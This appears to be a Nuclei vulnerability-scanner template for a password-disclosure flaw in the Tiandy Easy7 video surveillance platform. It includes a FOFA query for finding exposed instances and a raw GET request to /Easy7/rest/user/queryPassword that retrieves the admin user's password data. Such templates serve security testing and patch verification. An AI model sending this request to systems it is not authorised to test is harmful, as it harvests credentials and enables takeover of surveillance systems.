id: TianDiWeiYe-Easy7-queryPassword-Information-Disclosure

info:
  name: 天地伟业Easy7 /Easy7/rest/user/queryPassword 敏感信息泄露
  author: HuanXiong
  severity: medium
  description: |-
    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
    天地伟业Easy7 /Easy7/rest/user/queryPassword 接口存在敏感信息泄露漏洞，攻击者可通过构造特定HTTP请求，在未授权或低权限状态下获取系统内所有用户的密码信息，危害系统安全。
  reference: |-
    -
  tags: Information Disclosure
  
http:
  - raw:
      - |-
        GET /Easy7/rest/user/queryPassword?userName=admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 敏感信息泄露
        dsl:
          - "status_code==200 && contains_all(body,'content','count','ret')"